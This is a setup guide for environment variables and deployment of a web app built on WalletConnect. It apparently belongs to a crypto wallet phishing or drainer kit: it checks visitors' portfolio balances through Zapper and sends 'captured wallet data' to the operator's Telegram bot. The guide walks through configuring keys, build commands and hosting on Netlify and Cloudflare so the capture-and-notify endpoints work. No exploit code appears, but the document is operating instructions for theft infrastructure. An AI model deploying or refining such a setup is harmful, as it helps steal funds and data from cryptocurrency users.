# Environment Variables Setup Guide

## Required Variables

| Variable | Used by | Purpose |
|---|---|---|
| `VITE_WALLETCONNECT_PROJECT_ID` | Build (baked in) | Powers the WalletConnect / Reown modal |
| `ZAPPER_API_KEYS` | Serverless function | Portfolio balance data (comma-separate multiple keys) |
| `TELEGRAM_BOT_TOKEN` | Serverless function | Sends captured wallet data to Telegram |
| `TELEGRAM_CHAT_ID` | Serverless function | Your Telegram chat/channel ID |

> **`VITE_` prefix is required.** Vite only exposes env vars to the frontend bundle when they start with `VITE_`. This variable is baked into the JS at build time — set it BEFORE triggering a build.

---

## Get Your WalletConnect Project ID

1. Go to **[cloud.reown.com](https://cloud.reown.com)**
2. Sign up / log in → **Create a new project**
3. Copy the **Project ID** (32-char hex, no 0x prefix — e.g. `abc123...`)
4. Add your deployed domain to **Settings → Allowlist** (e.g. `https://your-site.netlify.app`)
5. Set `VITE_WALLETCONNECT_PROJECT_ID=<your-id>` in your platform dashboard

---

## Platform Setup

### Netlify (Git deploy)

Set in **Site Settings → Environment Variables**:
```
VITE_WALLETCONNECT_PROJECT_ID = your-reown-project-id
ZAPPER_API_KEYS               = key1,key2
TELEGRAM_BOT_TOKEN            = 123456:ABCdef...
TELEGRAM_CHAT_ID              = -1001234567890
```

Build settings (already in `netlify.toml` — no manual config needed):
- **Build command**: `npm install && cd client && npm install && cd .. && npm run build`
- **Publish directory**: `dist/public`
- **Functions directory**: `netlify/functions`

---

### Cloudflare Pages (Git deploy)

Cloudflare does NOT read `netlify.toml`. Set everything in the **Cloudflare dashboard**:

1. Go to **Workers & Pages → Create → Pages → Connect to Git**
2. Select your repo
3. Under **Build settings**:
   - **Framework preset**: None
   - **Build command**: `npm install && cd client && npm install && cd .. && npm run build`
   - **Build output directory**: `dist/public`
4. Under **Environment variables** (Production):
```
VITE_WALLETCONNECT_PROJECT_ID = your-reown-project-id
ZAPPER_API_KEYS               = key1,key2
TELEGRAM_BOT_TOKEN            = 123456:ABCdef...
TELEGRAM_CHAT_ID              = -1001234567890
```
5. Click **Save and Deploy**

> **Note:** Cloudflare Pages does not support Netlify Functions. The `/api/notify`, `/api/config`, and `/api/portfolio/:address` endpoints will only work on Netlify. On Cloudflare, WalletConnect will work (it reads the env var at build time), but Telegram notifications and Zapper portfolio data will not fire unless you also set up Cloudflare Workers separately.

The `_redirects` file (already in `client/public/`) handles SPA routing on both Netlify and Cloudflare Pages automatically.

---

### Local Development

Create a `.env` file in the project root:
```bash
VITE_WALLETCONNECT_PROJECT_ID=your_project_id
ZAPPER_API_KEYS=your_zapper_key
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

Never commit `.env` to Git.
